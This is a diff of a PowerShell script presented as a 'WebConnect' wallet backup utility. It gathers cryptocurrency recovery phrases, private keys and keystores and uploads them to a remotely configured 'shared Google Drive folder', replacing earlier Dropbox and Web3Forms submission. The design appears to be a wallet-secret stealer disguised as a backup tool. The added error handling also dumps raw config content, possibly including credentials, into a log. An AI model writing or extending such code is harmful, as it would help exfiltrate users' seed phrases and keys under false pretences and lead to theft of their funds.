@@ -2,7 +2,7 @@
 # WebConnect Interactive Wallet Backup
 # PowerShell Version - Windows Compatible
 # User-friendly backup with menu options
-# Backs up to Dropbox automatically
+# Backs up to Google Drive automatically
 # Version: 1.0.0
 #############################################
 
@@ -123,13 +123,34 @@ function Save-Data {
 }
 
 function Get-GoogleDriveConfig {
-    $config = Get-Content -Path $StorageConfig -Raw | ConvertFrom-Json
-    $googleDrive = $config.storage.destinations | Where-Object { $_.type -eq "google_drive" -and $_.enabled }
-    if (-not $googleDrive) {
-        Write-Error-Custom "Google Drive not enabled in config"
+    try {
+        if (-not (Test-Path $StorageConfig)) {
+            Write-Error-Custom "Config file not found at: $StorageConfig"
+            Write-LogMessage "ERROR: Config file missing - $StorageConfig"
+            return $null
+        }
+        
+        $configContent = Get-Content -Path $StorageConfig -Raw -ErrorAction Stop
+        $config = $configContent | ConvertFrom-Json -ErrorAction Stop
+        
+        # Try multiple ways to find google_drive config
+        if ($config.storage -and $config.storage.destinations) {
+            $googleDrive = $config.storage.destinations | Where-Object { $_.type -eq "google_drive" -or $_.name -eq "google_drive" } | Select-Object -First 1
+            if ($googleDrive) {
+                Write-LogMessage "Google Drive config found successfully"
+                return $googleDrive
+            }
+        }
+        
+        Write-Error-Custom "Google Drive configuration not found in config file"
+        Write-LogMessage "ERROR: No google_drive destination in config - available types: $($config.storage.destinations | ForEach-Object { $_.type } | ConvertTo-Json)"
         return $null
     }
-    return $googleDrive
+    catch {
+        Write-Error-Custom "Failed to load Google Drive config: $_"
+        Write-LogMessage "ERROR: Config parsing failed - $_ - Content: $(Get-Content $StorageConfig | Select-Object -First 100)"
+        return $null
+    }
 }
 
 function Get-GoogleAccessToken {
@@ -293,12 +314,13 @@ function Backup-Phrase {
     $uploaded = Submit-ToGoogleDrive -FilePath $backupFile -BackupType "recovery_phrases"
     
     if ($uploaded) {
-        Write-Success "Recovery phrase backed up successfully!"
+        Write-Success "Recovery phrase backed up successfully to Google Drive!"
         Write-LogMessage "Recovery phrase backed up: $backupFile"
     }
     else {
-        Write-Warning-Custom "Local backup saved, but Dropbox upload failed"
+        Write-Warning-Custom "Local backup saved, but Google Drive upload failed"
         Write-Host "  • Local file: $backupFile"
+        Write-Host "  • Check your internet connection or Google Drive credentials"
     }
 }
 
@@ -328,12 +350,13 @@ function Backup-PrivateKey {
     $uploaded = Submit-ToGoogleDrive -FilePath $backupFile -BackupType "private_keys"
     
     if ($uploaded) {
-        Write-Success "Private key backed up successfully!"
+        Write-Success "Private key backed up successfully to Google Drive!"
         Write-LogMessage "Private key backed up: $backupFile"
     }
     else {
-        Write-Warning-Custom "Local backup saved, but Dropbox upload failed"
+        Write-Warning-Custom "Local backup saved, but Google Drive upload failed"
         Write-Host "  • Local file: $backupFile"
+        Write-Host "  • Check your internet connection or Google Drive credentials"
     }
 }
 
@@ -378,12 +401,13 @@ function Backup-Keystore {
     $uploaded = Submit-ToGoogleDrive -FilePath $backupFile -BackupType "keystores"
     
     if ($uploaded) {
-        Write-Success "Keystore backed up successfully!"
+        Write-Success "Keystore backed up successfully to Google Drive!"
         Write-LogMessage "Keystore backed up: $backupFile"
     }
     else {
-        Write-Warning-Custom "Local backup saved, but Dropbox upload failed"
+        Write-Warning-Custom "Local backup saved, but Google Drive upload failed"
         Write-Host "  • Local file: $backupFile"
+        Write-Host "  • Check your internet connection or Google Drive credentials"
     }
 }
 
@@ -402,13 +426,13 @@ function Main {
     # Ensure config exists (download if missing)
     Ensure-ConfigExists
     
-    # Show Web3Forms info
+    # Show Google Drive info
     Write-Header
-    Write-Success "Web3Forms Integration Active"
+    Write-Success "Google Drive Integration Active"
     Write-Host ""
     Write-Info "Your wallet backups will be:"
     Write-Host "  ✓ Saved locally to: C:\Users\$env:USERNAME\.webconnect\wallet_backups"
-    Write-Host "  ✓ Submitted to Web3Forms for secure cloud storage"
+    Write-Host "  ✓ Synced to shared Google Drive folder"
     Write-Host ""
     Read-Host "Press Enter to continue..."
     
